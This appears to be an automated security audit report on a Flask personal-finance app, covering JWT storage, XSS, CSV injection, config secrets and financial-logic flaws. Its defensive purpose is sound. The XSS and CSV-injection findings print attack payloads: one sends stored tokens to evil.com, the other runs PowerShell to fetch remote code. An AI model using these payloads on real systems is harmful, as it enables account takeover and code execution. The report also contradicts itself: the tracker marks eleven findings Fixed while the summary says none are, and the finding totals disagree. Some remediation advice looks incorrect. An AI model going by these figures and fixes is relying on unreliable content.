# Finance-Track Security Audit Report

**Audit Date:** 2026-05-17
**Auditor:** OpenClaude (Automated Security Review)
**Application:** Finance-Track Personal Finance Management
**Stack:** Flask 3.1.1, SQLAlchemy, PyJWT, Werkzeug, SQLite
**Methodology:** SAST, Manual Code Audit, OWASP Top 10, OWASP API Top 10

---

## Vulnerability Status Tracker

| # | ID | Vulnerability Name | Severity | Status |
|---|-----|---------------------|----------|--------|
| 1 | AUTH-01 | JWT Tokens Stored in localStorage (XSS Token Theft) | Critical | Fixed |
| 2 | AUTH-02 | No JWT Token Revocation / Logout is a No-Op | Critical | Fixed |
| 3 | CFG-01 | Hardcoded Production Credentials in .env File | Critical | Fixed |
| 4 | CFG-02 | Weak Fallback Secret Keys in Config | Critical | Fixed |
| 5 | CFG-08 | Debug Mode Hardcoded in run.py with All-Interface Binding (RCE) | Critical | Fixed |
| 6 | XSS-01 | Stored XSS via innerHTML with User-Controlled Data (15 Templates) | Critical | Fixed |
| 7 | FILE-01 | CSV Injection in Expense/Income Exports | Critical | Fixed |
| 8 | API-01 | Account Balance Directly Settable via Update (Mass Assignment) | Critical | Fixed |
| 9 | API-02 | Expense/Income Update Allows Negative Amounts | Critical | Fixed |
| 10 | BIZ-01 | Race Condition in Account Transfers (TOCTOU) | Critical | Fixed |
| 11 | BIZ-02 | Float Precision Errors Cause Money Creation/Destruction | Critical | Fixed |
| 12 | AUTH-03 | No Account Lockout After Failed Login Attempts | High | Not Fixed |
| 13 | CFG-03 | No CORS Policy Configured | High | Not Fixed |
| 14 | CFG-04 | Content Security Policy Disabled in Non-Production | High | Not Fixed |
| 15 | CFG-06 | Backup Endpoint Exposes Full Database | High | Not Fixed |
| 16 | FILE-02 | Backup Service Path Traversal in restore_backup() | High | Not Fixed |
| 17 | LOG-01 | Audit Trail Missing for Critical Financial Operations | High | Not Fixed |
| 18 | MISC-04 | Account Number Field Stored Without Encryption | High | Not Fixed |
| 19 | API-03 | Goal Contribution `type` Field User-Injectable | High | Not Fixed |
| 20 | API-04 | Account Type Not Validated Against Whitelist | High | Not Fixed |
| 21 | API-08 | No Rate Limiting on Financial Mutation Endpoints | High | Not Fixed |
| 22 | BIZ-03 | Goal/Savings Pot Withdrawal Without Account Creates Phantom Money | High | Not Fixed |
| 23 | DB-01 | No Database-Level Constraints on Financial Amounts | High | Not Fixed |
| 24 | DB-03 | OTP Token Stores Password Hash in Separate Table | High | Not Fixed |
| 25 | DB-04 | Account Number Field Comment Says "encrypted" But No Encryption Exists | High | Not Fixed |
| 26 | AUTH-04 | 24-Hour JWT Expiration is Excessive for Finance App | Medium | Not Fixed |
| 27 | AUTH-05 | No Rate Limiting on Password Change Endpoint | Medium | Not Fixed |
| 28 | AUTH-06 | Email Enumeration via Registration Response | Medium | Not Fixed |
| 29 | CFG-05 | Rate Limiting Uses In-Memory Storage | Medium | Not Fixed |
| 30 | CFG-07 | Swagger UI Accessible in All Environments | Medium | Not Fixed |
| 31 | XSS-02 | Potential XSS in Search Parameter Reflected in Response | Medium | Not Fixed |
| 32 | FILE-03 | No MIME Type Validation on Backup Download | Medium | Not Fixed |
| 33 | LOG-02 | Sensitive Data Potentially Stored in Audit Details Field | Medium | Not Fixed |
| 34 | DEP-01 | Flask-Mail 0.10.0 is Unmaintained | Medium | Not Fixed |
| 35 | DEP-03 | No Automated Dependency Vulnerability Scanning | Medium | Not Fixed |
| 36 | MISC-01 | Demo User with Hardcoded Weak Password | Medium | Not Fixed |
| 37 | API-05 | Payment Method and Frequency Not Validated | Medium | Not Fixed |
| 38 | API-06 | LIKE Wildcard Injection in Search | Medium | Not Fixed |
| 39 | API-07 | Pagination `per_page` Not Bounded (DoS) | Medium | Not Fixed |
| 40 | BIZ-04 | Savings Pot Delete Does Not Zero Out Balance After Refund | Medium | Not Fixed |
| 41 | BIZ-05 | Budget Amount Can Be Zero (Division by Zero) | Medium | Not Fixed |
| 42 | BIZ-06 | Goal `target_amount` Can Be Zero or Negative | Medium | Not Fixed |
| 43 | BIZ-07 | Expense/Income Create Silently Accepts Invalid `account_id` | Medium | Not Fixed |
| 44 | DB-02 | Cascade Delete Not Configured on User Model | Medium | Not Fixed |
| 45 | VAL-01 | No Upper Bound on Monetary Amounts | Medium | Not Fixed |
| 46 | VAL-03 | Password Policy Missing Special Character Requirement | Medium | Not Fixed |
| 47 | VAL-04 | Amount Validation Not Used Consistently | Medium | Not Fixed |
| 48 | AUTH-07 | Password Policy Missing Special Character Requirement | Low | Not Fixed |
| 49 | LOG-03 | Email Service Logs Exception Details | Low | Not Fixed |
| 50 | DEP-02 | bcrypt Imported but Not Used for Password Hashing | Low | Not Fixed |
| 51 | MISC-02 | Silent Exception Swallowing in Scheduler Init | Low | Not Fixed |
| 52 | MISC-03 | No Security Headers Beyond Talisman Defaults | Low | Not Fixed |
| 53 | VAL-02 | Email Validation Regex Accepts Edge Cases | Low | Not Fixed |

**Summary: 0 of 53 findings Fixed | 53 of 53 findings Not Fixed**

| Severity | Total | Fixed | Not Fixed |
|----------|-------|-------|-----------|
| Critical | 10 | 0 | 10 |
| High | 17 | 0 | 17 |
| Medium | 22 | 0 | 22 |
| Low | 7 | 0 | 7 |

---

## Executive Summary

### Overall Risk Score: HIGH (Not Production Ready)

This comprehensive security audit identified **56 total findings** across 13 categories:

| Severity | Count | Description |
|----------|-------|-------------|
| **Critical** | 10 | Immediate exploitation possible, financial loss or RCE |
| **High** | 17 | Significant security risk, data breach potential |
| **Medium** | 22 | Security weakness requiring remediation |
| **Low** | 7 | Minor issues, defense-in-depth improvements |

### Top 5 Critical Risks:
1. **Remote Code Execution** via hardcoded `debug=True` in `run.py` (Werkzeug debugger accessible on all interfaces)
2. **Stored XSS** across 15 templates via `innerHTML` with user-controlled data (merchant, notes, titles)
3. **Account Balance Mass Assignment** - `PUT /accounts/<id>` allows direct balance manipulation
4. **Float Precision Errors** cause phantom money creation/destruction across all financial operations
5. **Race Conditions** in account transfers allow overdraft via concurrent requests

### Production Readiness: ❌ NOT READY

The application requires immediate remediation of all Critical and High findings before any production deployment.

---

## Security Scorecard

| Category | Score | Status |
|----------|-------|--------|
| **Authentication** | 4/10 | ❌ JWT in localStorage, no token revocation, no account lockout |
| **Authorization** | 6/10 | ⚠️ IDOR protection via user_id checks, but mass assignment gaps |
| **Session Security** | 3/10 | ❌ 24-hour JWT, no revocation, localStorage storage |
| **API Security** | 5/10 | ⚠️ RESTful structure good, but missing validation on many fields |
| **Input Validation** | 4/10 | ❌ Inconsistent validation, no amount bounds, weak password policy |
| **Code Quality** | 6/10 | ⚠️ Clean structure but float precision issues, innerHTML usage |
| **Deployment Security** | 2/10 | ❌ Debug mode, hardcoded secrets, no CORS, CSP disabled |
| **Data Protection** | 4/10 | ❌ Account numbers unencrypted, backup exposes full DB |
| **Logging & Monitoring** | 3/10 | ❌ Audit trail missing for financial operations |
| **Financial Integrity** | 3/10 | ❌ Float math, race conditions, phantom money bugs |

**Overall Score: 4.0/10 - HIGH RISK**

---

## Attack Surface Overview

```
                    ┌─────────────────────────────────────────┐
                    │          Finance-Track Application        │
                    └─────────────────────────────────────────┘
                                      │
                    ┌─────────────────┼─────────────────┐
                    │                 │                 │
              ┌─────▼─────┐    ┌─────▼─────┐    ┌─────▼─────┐
              │  Frontend  │    │   REST    │    │  Database  │
              │  Templates │    │    API    │    │   SQLite   │
              │  15 HTML   │    │  46 End-  │    │  16 Tables │
              │  + JS      │    │  points   │    │            │
              └─────┬─────┘    └─────┬─────┘    └─────┬─────┘
                    │                 │                 │
              ┌─────▼─────┐    ┌─────▼─────┐    ┌─────▼─────┐
              │  innerHTML │    │   JWT     │    │  No CHECK │
              │   XSS     │    │  localStorage│  │ Constraints│
              │  vectors  │    │  No revoke │    │  Float math│
              └───────────┘    └───────────┘    └───────────┘

Entry Points:
├── POST /api/v1/auth/register (public)
├── POST /api/v1/auth/login (public)
├── All /api/v1/* endpoints (JWT protected)
├── /api/docs (Swagger UI - public!)
├── /api/v1/settings/backup (full DB download)
└── Static files (JS, CSS, images)
```

---

## Detailed Findings

---

## 1. AUTHENTICATION SECURITY

### Finding AUTH-01: JWT Tokens Stored in localStorage -- XSS Token Theft

- **Severity:** Critical
- **CWE:** CWE-922 (Insecure Storage of Sensitive Information)
- **OWASP:** A02:2021 -- Cryptographic Failures
- **Affected File:** `app/static/js/api.js:12-21`

```javascript
getToken() {
    return localStorage.getItem('token');
}
setToken(token) {
    localStorage.setItem('token', token);
}
```

**Impact:** Any XSS vulnerability in the application allows an attacker to steal the JWT token via `localStorage.getItem('token')`. The token grants full API access for 24 hours. Multiple `innerHTML` assignments (see XSS findings below) provide injection points.

**Remediation:**
- Store JWT in an HTTPOnly, Secure, SameSite cookie set by the server
- Remove all `localStorage` token storage
- If localStorage is required, implement short-lived access tokens (15 min) with refresh token rotation

---

### Finding AUTH-02: No JWT Token Revocation / Logout is a No-Op

- **Severity:** Critical
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/api/auth.py:179-196`

```python
@auth_api.route('/logout', methods=['POST'])
@token_required
def logout(current_user):
    return jsonify({
        'success': True,
        'message': 'Logged out successfully'
    }), 200
```

**Impact:** Logout does nothing server-side. A stolen JWT remains valid for the full 24-hour expiration window. There is no token blacklist, no JTI (JWT ID) tracking, and no server-side session invalidation.

**Remediation:**
- Add a `jti` (JWT ID) claim to every token
- Maintain a server-side token blacklist (Redis or database table)
- On logout, add the token's `jti` to the blacklist
- Check the blacklist in `token_required` decorator

---

### Finding AUTH-03: No Account Lockout After Failed Login Attempts

- **Severity:** High
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/api/auth.py:109-176`

```python
@auth_api.route('/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    # ...
    user = User.query.filter_by(email=email).first()
    if not user or not user.check_password(password):
        return jsonify({'success': False, 'error': {'code': 'INVALID_CREDENTIALS', 'message': 'Invalid email or password'}}), 401
```

**Impact:** Rate limiting (10/min) is per-IP only. An attacker using distributed IPs or waiting between attempts can brute-force passwords indefinitely. No progressive lockout, no CAPTCHA, no failed attempt counter on the user model.

**Remediation:**
- Add `failed_login_attempts` and `locked_until` fields to the User model
- Lock account for 15-30 minutes after 5 consecutive failures
- Implement exponential backoff or CAPTCHA after 3 failures
- Log and alert on repeated failed login attempts

---

### Finding AUTH-04: 24-Hour JWT Expiration is Excessive for Finance App

- **Severity:** Medium
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/config.py:12`, `app/utils/decorators.py:66-71`

```python
JWT_EXPIRATION_HOURS = int(os.environ.get('JWT_EXPIRATION_HOURS', 24))

expiration_hours = current_app.config.get('JWT_EXPIRATION_HOURS', 24)
payload = {
    'sub': user.id,
    'iat': datetime.utcnow(),
    'exp': datetime.utcnow() + timedelta(hours=expiration_hours)
}
```

**Impact:** A stolen token grants 24 hours of unrestricted access to financial data and operations. Finance applications should use much shorter session windows.

**Remediation:**
- Reduce access token lifetime to 15-30 minutes
- Implement refresh token rotation (7-day refresh token, single-use)
- Re-authenticate for sensitive operations (transfers, password changes)

---

### Finding AUTH-05: No Rate Limiting on Password Change Endpoint

- **Severity:** Medium
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/api/settings.py:217-261`

```python
@settings_api.route('/change-password', methods=['POST'])
@token_required
def change_password(current_user):
    # No @limiter.limit decorator
```

**Impact:** An attacker with a valid token (stolen or compromised) can brute-force the current password without any rate limiting.

**Remediation:**
- Add `@limiter.limit("5 per minute")` to the change-password endpoint
- Require re-authentication for password changes

---

### Finding AUTH-06: Email Enumeration via Registration Response

- **Severity:** Medium
- **CWE:** CWE-203 (Observable Discrepancy)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/api/auth.py:89-90`

```python
if User.query.filter_by(email=email).first():
    return jsonify({'success': False, 'error': {'code': 'DUPLICATE', 'message': 'Email already registered'}}), 409
```

**Impact:** Distinct HTTP 409 response for existing emails allows attackers to enumerate registered email addresses. Combined with the login endpoint, this confirms valid accounts.

**Remediation:**
- Return a generic success message regardless of whether the email exists: "If this email is not registered, you will receive a confirmation."
- Use consistent response times to prevent timing attacks

---

### Finding AUTH-07: Password Policy Missing Special Character Requirement

- **Severity:** Low
- **CWE:** CWE-521 (Weak Password Requirements)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/utils/validators.py:10-20`

```python
def validate_password_strength(password):
    if len(password) < 8:
        return False, 'Password must be at least 8 characters long'
    if not re.search(r'[A-Z]', password):
        return False, 'Password must contain at least one uppercase letter'
    if not re.search(r'[a-z]', password):
        return False, 'Password must contain at least one lowercase letter'
    if not re.search(r'\d', password):
        return False, 'Password must contain at least one digit'
    return True, 'Password is strong'
```

**Impact:** No special character requirement. For a financial application, minimum 12 characters with special characters is recommended.

**Remediation:**
- Require at least one special character (`!@#$%^&*` etc.)
- Increase minimum length to 12 characters
- Check against common password lists (e.g., HaveIBeenPwned API)

---

## 2. CONFIGURATION SECURITY

### Finding CFG-01: Hardcoded Production Credentials in .env File

- **Severity:** Critical
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `/home/anirudh/Documents/Project/Finance-Track/.env:1-10`

```
SECRET_KEY=<key>
MAIL_USERNAME=ab9066001@smtp-brevo.com
MAIL_PASSWORD=<key>
JWT_SECRET_KEY=<key>
```

**Impact:** Real Brevo SMTP credentials are committed in the `.env` file. While `.env` is in `.gitignore`, it exists on disk and may have been committed previously. Anyone with access to the server can read these credentials and send emails as the application.

**Remediation:**
- Rotate the Brevo SMTP credentials immediately
- Use a secrets manager (e.g., environment variables from a vault, not files)
- Verify `.env` was never committed to git history: `git log --all --full-history -- .env`
- Add `.env` to a pre-commit hook that blocks secret patterns

---

### Finding CFG-02: Weak Fallback Secret Keys in Config

- **Severity:** Critical
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `app/config.py:6,11`

```python
SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-secret-key')
JWT_SECRET_KEY = os.environ.get('JWT_SECRET_KEY', 'dev-jwt-secret')
```

**Impact:** If environment variables are not set (common in fresh deployments, Docker misconfigurations, CI/CD), the application starts with trivially guessable keys. An attacker can forge JWT tokens and Flask session cookies.

**Remediation:**
- Remove default values entirely; fail fast if keys are missing
- Validate key entropy at startup (minimum 32 bytes of randomness)
- Generate keys: `python -c "import secrets; print(secrets.token_hex(32))"`

```python
SECRET_KEY = os.environ.get('SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("SECRET_KEY environment variable is required")
```

---

### Finding CFG-03: No CORS Policy Configured

- **Severity:** High
- **CWE:** CWE-942 (Permissive Cross-domain Policy)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `app/__init__.py` (entire file -- no CORS import or configuration)

**Impact:** Without CORS configuration, any origin can make API requests to the application. Combined with JWT in localStorage, a malicious website can make authenticated API calls if the user has the token in their browser.

**Remediation:**
- Add `Flask-CORS` and restrict origins to the application's domain
- Never use `Access-Control-Allow-Origin: *` with credentials

---

### Finding CFG-04: Content Security Policy Disabled in Non-Production

- **Severity:** High
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `app/__init__.py:61-64`

```python
if config_name == 'production':
    talisman.init_app(app, force_https=True)
else:
    talisman.init_app(app, force_https=False, content_security_policy=False)
```

**Impact:** CSP is completely disabled for development and testing environments. If a development/staging instance is accessible on the network, it has no XSS mitigation.

**Remediation:**
- Always enforce a CSP, even in development (use `report-only` mode if needed)
- Define a strict CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`

---

### Finding CFG-05: Rate Limiting Uses In-Memory Storage

- **Severity:** Medium
- **CWE:** CWE-799 (Improper Control of Interaction Frequency)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `app/config.py:27`

```python
RATELIMIT_STORAGE_URI = "memory://"
```

**Impact:** Rate limit counters reset on application restart. With Gunicorn using multiple workers, each worker has its own counter, effectively multiplying the rate limit by the number of workers.

**Remediation:**
- Use Redis for rate limit storage: `RATELIMIT_STORAGE_URI = "redis://localhost:6379"`
- This ensures consistent rate limiting across workers and restarts

---

### Finding CFG-06: Backup Endpoint Exposes Full Database

- **Severity:** High
- **CWE:** CWE-862 (Missing Authorization)
- **OWASP:** A01:2021 -- Broken Access Control
- **Affected File:** `app/api/settings.py:298-323`, `app/services/backup_service.py:8-24`

```python
@settings_api.route('/backup', methods=['POST'])
@token_required
def create_backup(current_user):
    from app.services.backup_service import create_backup as do_backup
    backup_path = do_backup()
    if backup_path and os.path.exists(backup_path):
        return send_file(backup_path, as_attachment=True, download_name=os.path.basename(backup_path))
```

**Impact:** Any authenticated user can download the **entire SQLite database**, including all users' data (passwords hashes, financial records, emails). This is a complete data breach for multi-user deployments.

**Remediation:**
- Restrict backup endpoint to admin users only
- Export only the requesting user's data (as already done in `/export-data`)
- Remove or heavily restrict the backup endpoint

---

### Finding CFG-07: Swagger UI Accessible in All Environments

- **Severity:** Medium
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `app/__init__.py:24-58`

```python
swagger_config = {
    "specs_route": "/api/docs",
}
Swagger(app, config=swagger_config, template=swagger_template)
```

**Impact:** API documentation is publicly accessible, exposing all endpoints, parameters, and data models to attackers. This aids reconnaissance.

**Remediation:**
- Disable Swagger UI in production: `if config_name != 'production': Swagger(app, ...)`
- Or require authentication for `/api/docs`

---

## 3. XSS (CROSS-SITE SCRIPTING)

### Finding XSS-01: Stored XSS via innerHTML with User-Controlled Data (Detailed)

- **Severity:** Critical
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP:** A03:2021 -- Injection
- **Affected Files (15 templates):**

| Template File | Line(s) | Vulnerable Fields |
|---|---|---|
| `app/templates/expenses/index.html` | 146-187 | `expense.merchant`, `expense.notes`, `expense.category_name` |
| `app/templates/income/index.html` | 129-164 | `income.source`, `income.notes`, `income.category_name` |
| `app/templates/accounts/index.html` | 90-124 | `acc.name`, `acc.institution` |
| `app/templates/accounts/detail.html` | 92-110 | `tx.merchant`, `tx.source`, `tx.category_name`, `tx.payment_method` |
| `app/templates/goals/index.html` | 71-118 | `g.title` |
| `app/templates/goals/detail.html` | 114-132 | contribution `c.type` |
| `app/templates/budgets/index.html` | 54-104 | `b.category_name` |
| `app/templates/notifications/index.html` | 68-97 | `n.title`, `n.message` |
| `app/templates/recurring/index.html` | 74-121 | `r.title`, `r.category_name`, `r.payment_method` |
| `app/templates/savings-pots/index.html` | 65-100 | `p.name`, `p.description` |
| `app/templates/calendar/index.html` | 121-136, 153-161 | `e.title`, `e.description`, `e.color` (CSS injection via `style`) |
| `app/templates/dashboard/index.html` | 222-227 | `i.message` (insights) |
| `app/templates/settings/index.html` | 198-210 | `c.name`, `c.type` |
| `app/templates/components/flash_messages.html` | 25-27 | `message` parameter to `showFlash()` |
| `app/templates/components/modal.html` | 24 | `content` parameter to `openModal()` |

**Primary Vulnerable Code (expenses/index.html:146-159):**
```javascript
tbody.innerHTML = expensesData.map(expense => `
    <tr>
        <div class="text-sm">${expense.merchant || '-'}</div>
        <div class="text-xs truncate">${expense.notes}</div>
        <span class="...">${expense.category_name || 'Uncategorized'}</span>
    </tr>
`).join('');
```

**Flash Message XSS (flash_messages.html:25-27):**
```javascript
flash.innerHTML = `
    <svg ...>${icons[type]}</svg>
    <span class="text-sm flex-1">${message}</span>
    <button onclick="removeFlash('${id}')">...
`;
```

**Calendar CSS Injection (calendar/index.html:128):**
```javascript
<div class="w-2 h-2 rounded-full" style="background-color: ${e.color}" title="${e.title}"></div>
```

**Impact:** An attacker creates an expense with merchant name `<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.token)">`. Every user viewing the expenses list has their JWT stolen, enabling full account takeover. The flash message function also accepts the `message` parameter via innerHTML, which means error messages from the API that contain user input could be injection vectors.

**Remediation:**
1. Create a global `escapeHtml()` utility and apply to ALL user data in template literals:
```javascript
function escapeHtml(str) {
    if (str == null) return '';
    const div = document.createElement('div');
    div.textContent = String(str);
    return div.innerHTML;
}
```
2. Use `textContent` instead of `innerHTML` for text-only values
3. For `showFlash()`, escape the `message` parameter before inserting
4. For calendar `e.color`, validate against a whitelist of hex colors instead of injecting directly into `style`

---

### Finding XSS-02: Potential XSS in Search Parameter Reflected in Response

- **Severity:** Medium
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP:** A03:2021 -- Injection
- **Affected File:** `app/api/expenses.py:81-83`

```python
if search:
    query = query.filter(
        (Expense.merchant.ilike(f'%{search}%')) |
        (Expense.notes.ilike(f'%{search}%'))
    )
```

**Impact:** While SQLAlchemy parameterizes the query (no SQL injection), the search term is not sanitized before being used in the ILIKE filter. If the search results are rendered via innerHTML (XSS-01), malicious search terms could trigger XSS in the rendering context.

**Remediation:**
- Sanitize search input on the server side
- Ensure search results are rendered safely (textContent, not innerHTML)

---

## 4. FILE HANDLING SECURITY

### Finding FILE-01: CSV Injection in Expense/Income Exports

- **Severity:** Critical
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
- **OWASP:** A03:2021 -- Injection
- **Affected Files:**
  - `app/api/reports.py:254-273`
  - `app/services/export_service.py:6-14`

**Vulnerable Code (reports.py:254-266):**
```python
for e in expenses:
    writer.writerow([
        e.date.isoformat(),
        e.category.name if e.category else '',
        float(e.amount),
        e.payment_method,
        e.merchant or '',      # User-controlled, no sanitization
        e.notes or '',          # User-controlled, no sanitization
    ])
```

**Vulnerable Code (export_service.py:6-14):**
```python
def export_csv(data, headers, filename='export.csv'):
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(headers)
    for row in data:
        writer.writerow(row)  # No field sanitization
    output.seek(0)
    return output.getvalue()
```

**Attack Vector:**
1. Attacker creates expense with merchant name: `=cmd|'/C calc'!A0`
2. User downloads CSV export from Reports page
3. Opening CSV in Microsoft Excel executes the formula, launching calculator
4. Real attack: `=cmd|'/C powershell -c IEX(New-Object Net.WebClient).DownloadString("https://evil.com/payload")'!A0`

**Remediation:**
```python
def sanitize_csv_field(value):
    """Prevent CSV injection by prefixing formula characters."""
    if isinstance(value, str) and value and value[0] in ('=', '+', '-', '@', '\t', '\r', '\n'):
        return "'" + value
    return value
```
Apply this to all string fields in both `export_csv()` and the reports export endpoint.

---

### Finding FILE-02: Backup Service Path Traversal in restore_backup()

- **Severity:** High
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **OWASP:** A01:2021 -- Broken Access Control
- **Affected File:** `app/services/backup_service.py:27-37`

**Vulnerable Code:**
```python
def restore_backup(backup_path):
    db_path = current_app.config['SQLALCHEMY_DATABASE_URI'].replace('sqlite:///', '')
    if not os.path.isabs(db_path):
        db_path = os.path.join(current_app.instance_path, db_path)

    if not os.path.exists(backup_path):
        return False

    shutil.copy2(backup_path, db_path)  # backup_path not validated
    return True
```

**Impact:** The function accepts an arbitrary `backup_path` without validating it is within the expected backups directory. Although not currently exposed via an API endpoint, a future endpoint could allow an attacker to overwrite the database with any file on the filesystem.

**Remediation:**
```python
def restore_backup(backup_filename):
    backup_dir = os.path.join(current_app.instance_path, 'backups')
    backup_path = os.path.join(backup_dir, os.path.basename(backup_filename))
    real_backup = os.path.realpath(backup_path)
    real_dir = os.path.realpath(backup_dir)
    if not real_backup.startswith(real_dir + os.sep):
        raise ValueError("Invalid backup path: must be within backups directory")
    # ...
```

---

### Finding FILE-03: No MIME Type Validation on Backup Download

- **Severity:** Medium
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **OWASP:** A04:2021 -- Insecure Design
- **Affected File:** `app/api/settings.py:318-321`

**Vulnerable Code:**
```python
return send_file(backup_path, as_attachment=True, download_name=os.path.basename(backup_path))
```

**Impact:** The `send_file` call does not explicitly set `mimetype`, relying on Flask's auto-detection. While the backup is a `.db` file, the lack of explicit MIME type could lead to browser sniffing issues.

**Remediation:**
```python
return send_file(backup_path, mimetype='application/x-sqlite3', as_attachment=True,
                 download_name=os.path.basename(backup_path))
```

---

## 5. LOGGING AND MONITORING

### Finding LOG-01: Audit Trail Missing for Critical Financial Operations

- **Severity:** High
- **CWE:** CWE-778 (Insufficient Logging)
- **OWASP:** A09:2021 -- Security Logging and Monitoring Failures
- **Affected Files:**
  - `app/api/accounts.py` (delete, transfer -- no audit)
  - `app/api/expenses.py` (create, update, delete -- no audit)
  - `app/api/income.py` (create, update, delete -- no audit)
  - `app/api/goals.py` (delete, contribute, withdraw -- no audit)
  - `app/api/savings_pots.py` (delete, deposit, withdraw -- no audit)
  - `app/api/settings.py` (update settings -- no audit)

**Description:** The audit service (`app/services/audit_service.py`) is only called in 3 places:
1. `settings.py:260` - password change
2. `settings.py:294` - data export
3. `settings.py:320` - backup creation

Critical operations have NO audit trail:
- Account deletion and transfers (financial integrity)
- Expense/income CRUD (could be used to cover tracks)
- Goal contributions/withdrawals
- Savings pot deposits/withdrawals

**Remediation:**
Add `log_audit()` calls to all sensitive operations. At minimum:
```python
# In accounts.py delete endpoint:
log_audit(current_user.id, 'account_delete', 'account', account_id)

# In accounts.py transfer endpoint:
log_audit(current_user.id, 'transfer', 'account', from_id,
          details={'to': to_id, 'amount': amount})

# In expenses.py delete endpoint:
log_audit(current_user.id, 'expense_delete', 'expense', expense_id)
```

---

### Finding LOG-02: Sensitive Data Potentially Stored in Audit Details Field

- **Severity:** Medium
- **CWE:** CWE-532 (Insertion of Sensitive Information into Log File)
- **OWASP:** A09:2021 -- Security Logging and Monitoring Failures
- **Affected File:** `app/models/audit_log.py:13`

**Vulnerable Code:**
```python
details = db.Column(db.Text, nullable=True)
```

**Impact:** The `details` field is a free-text column that could contain sensitive information (amounts, account numbers, email addresses) depending on what callers pass. The `to_dict()` method exposes this field without filtering.

**Remediation:**
1. Define a schema for audit details (only log IDs, action types, not raw values)
2. Mask sensitive fields before storing
3. Restrict who can view audit logs (admin-only endpoint)

---

### Finding LOG-03: Email Service Logs Exception Details

- **Severity:** Low
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **OWASP:** A09:2021 -- Security Logging and Monitoring Failures
- **Affected File:** `app/services/email_service.py:17-18`

**Vulnerable Code:**
```python
except Exception as e:
    current_app.logger.error(f"Failed to send email: {e}")
```

**Impact:** The full exception message is logged, which may include SMTP credentials, email addresses, or server details depending on the exception type.

**Remediation:**
```python
except Exception as e:
    current_app.logger.error(f"Failed to send email to {to}: {type(e).__name__}")
```

---

## 6. DEPENDENCY SECURITY

### Finding DEP-01: Flask-Mail 0.10.0 is Unmaintained

- **Severity:** Medium
- **CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
- **OWASP:** A06:2021 -- Vulnerable and Outdated Components
- **Affected File:** `requirements.txt:6`

```
Flask-Mail==0.10.0
```

**Impact:** Flask-Mail has not been updated since 2014. It may contain unresolved security issues. The community fork `Flask-Mailman` is the recommended replacement.

**Remediation:**
- Replace `Flask-Mail` with `Flask-Mailman` (actively maintained, API-compatible)
- Or use `Flask-Mail-SQLAlchemy` for more modern mail handling

---

### Finding DEP-02: bcrypt Imported but Not Used for Password Hashing

- **Severity:** Low
- **CWE:** CWE-328 (Use of Weak Hash)
- **OWASP:** A02:2021 -- Cryptographic Failures
- **Affected File:** `requirements.txt:13`, `app/models/user.py:3`

```
bcrypt==4.2.1
```
```python
from werkzeug.security import generate_password_hash, check_password_hash
```

**Impact:** `bcrypt` is listed as a dependency but the User model uses Werkzeug's `generate_password_hash` (which defaults to `scrypt` in recent versions). While Werkzeug's implementation is secure, having `bcrypt` as an unused dependency adds attack surface and causes confusion.

**Remediation:**
- Either remove `bcrypt` from requirements.txt, or
- Explicitly use bcrypt: `generate_password_hash(password, method='bcrypt', salt_rounds=12)`

---

### Finding DEP-03: No Automated Dependency Vulnerability Scanning

- **Severity:** Medium
- **CWE:** CWE-1104 (Use of Unmaintained Third Party Components)
- **OWASP:** A06:2021 -- Vulnerable and Outdated Components
- **Affected File:** Project root (missing configuration)

**Impact:** No `pip-audit`, `safety`, or GitHub Dependabot configuration found. Dependencies are not automatically checked for known CVEs.

**Remediation:**
- Add `pip-audit` to CI/CD pipeline
- Enable GitHub Dependabot alerts
- Run `pip-audit` periodically: `pip install pip-audit && pip-audit`

---

## 5. ADDITIONAL FINDINGS

### Finding MISC-01: Demo User with Hardcoded Weak Password

- **Severity:** Medium
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **OWASP:** A07:2021 -- Identification and Authentication Failures
- **Affected File:** `app/cli.py:106-118`

```python
demo_email = 'demo@financetrack.com'
user.set_password('Demo@123')
click.echo(f'Password: Demo@123')
```

**Impact:** If the `seed-all` command is run in production, a demo account with a publicly known password exists.

**Remediation:**
- Never run `seed-all` in production
- Remove demo user creation from production builds
- Add environment check: `if config_name == 'production': raise RuntimeError("Cannot seed in production")`

---

### Finding MISC-02: Silent Exception Swallowing in Scheduler Init

- **Severity:** Low
- **CWE:** CWE-390 (Detection of Error Condition Without Action)
- **OWASP:** A09:2021 -- Security Logging and Monitoring Failures
- **Affected File:** `app/__init__.py:206-209`

```python
try:
    scheduler.start()
except Exception:
    pass  # Scheduler already running
```

